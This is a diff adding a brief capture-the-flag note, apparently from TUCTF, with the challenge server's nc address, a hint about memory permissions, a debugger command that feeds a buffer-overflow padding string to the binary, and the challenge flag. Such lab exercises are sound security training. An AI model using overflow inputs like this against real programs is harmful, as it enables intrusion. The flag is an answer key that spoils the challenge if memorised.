@@ -1,0 +1,10 @@
+One small step for hacker's, one giant leap for pwning kind.
+
+nc chal.tuctf.com 30506
+
+Have you checked the memory permissions?
+
+gef➤  r <<< $(python -c 'print "A"*40 + "B"*4')
+
+TUCTF{4www..._b4by5_f1r57_3xpl017._h0w_cu73}
+
